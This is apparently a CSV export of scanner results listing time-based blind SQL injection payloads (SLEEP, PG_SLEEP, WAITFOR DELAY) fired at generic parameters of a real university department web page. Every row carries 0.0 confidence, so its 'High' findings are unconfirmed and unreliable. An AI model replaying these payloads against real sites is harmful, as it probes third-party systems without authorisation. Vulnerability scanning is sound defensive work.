Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=1%22+AND+SLEEP%285%29--#1574016421299-0f63f841-e7fb),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=1%27+AND+PG_SLEEP%285%29--#1574016421299-0f63f841-e7fb),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=1%22+AND+SLEEP%285%29--#1574016421299-0f63f841-e7fb),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=1%27+AND+PG_SLEEP%285%29--#1574016421299-0f63f841-e7fb),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=1%27+AND+PG_SLEEP%285%29--#1574016421299-0f63f841-e7fb),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016421299-0f63f841-e7fb),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=SLEEP%285%29%23#1574016421299-0f63f841-e7fb),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=SLEEP%285%29%23#1574016421299-0f63f841-e7fb),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=SLEEP%285%29%23#1574016421299-0f63f841-e7fb),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016421299-0f63f841-e7fb),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=SLEEP%285%29%23#1574016421299-0f63f841-e7fb),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=1%27+AND+SLEEP%285%29--#1574016421299-0f63f841-e7fb),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016421299-0f63f841-e7fb),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016421299-0f63f841-e7fb),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=1%27+AND+PG_SLEEP%285%29--#1574016421299-0f63f841-e7fb),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=1%22+AND+SLEEP%285%29--#1574016421299-0f63f841-e7fb),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=SLEEP%285%29%23#1574016421299-0f63f841-e7fb),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=SLEEP%285%29%23#1574016421299-0f63f841-e7fb),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=SLEEP%285%29%23#1574016421299-0f63f841-e7fb),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016421299-0f63f841-e7fb),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016421299-0f63f841-e7fb),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016421299-0f63f841-e7fb),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016421299-0f63f841-e7fb),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016421299-0f63f841-e7fb),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=1%27+AND+SLEEP%285%29--#1574016421299-0f63f841-e7fb),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=1%27+AND+SLEEP%285%29--#1574016421299-0f63f841-e7fb),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016421299-0f63f841-e7fb),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016421299-0f63f841-e7fb),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016421299-0f63f841-e7fb),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=1%27+AND+SLEEP%285%29--#1574016421299-0f63f841-e7fb),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016421299-0f63f841-e7fb),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016421299-0f63f841-e7fb),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=1%27+AND+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=1%27+AND+SLEEP%285%29--#1574016446128-383c784a-e794),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=1+OR+SLEEP%285%29#1574016446128-383c784a-e794),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=1+OR+SLEEP%285%29#1574016446128-383c784a-e794),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=1+OR+SLEEP%285%29#1574016446128-383c784a-e794),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=1%27+AND+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=SLEEP%285%29%23#1574016446128-383c784a-e794),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=1%27+AND+SLEEP%285%29--#1574016446128-383c784a-e794),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=1%27+AND+SLEEP%285%29--#1574016446128-383c784a-e794),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=1%27+AND+SLEEP%285%29--#1574016446128-383c784a-e794),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=1%27+AND+SLEEP%285%29--#1574016446128-383c784a-e794),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=1+OR+SLEEP%285%29#1574016446128-383c784a-e794),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=1+OR+SLEEP%285%29#1574016446128-383c784a-e794),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=1%27+AND+SLEEP%285%29--#1574016446128-383c784a-e794),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=1+OR+SLEEP%285%29#1574016446128-383c784a-e794),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=1%27+AND+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=1%27+AND+SLEEP%285%29--#1574016446128-383c784a-e794),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=1%27+AND+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=1+OR+SLEEP%285%29#1574016446128-383c784a-e794),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=1%27+AND+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=1%27+AND+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=1%27+AND+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=SLEEP%285%29%23#1574016446128-383c784a-e794),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=SLEEP%285%29%23#1574016446128-383c784a-e794),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=1%22+AND+SLEEP%285%29--#1574016446128-383c784a-e794),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016446128-383c784a-e794),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016446128-383c784a-e794),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
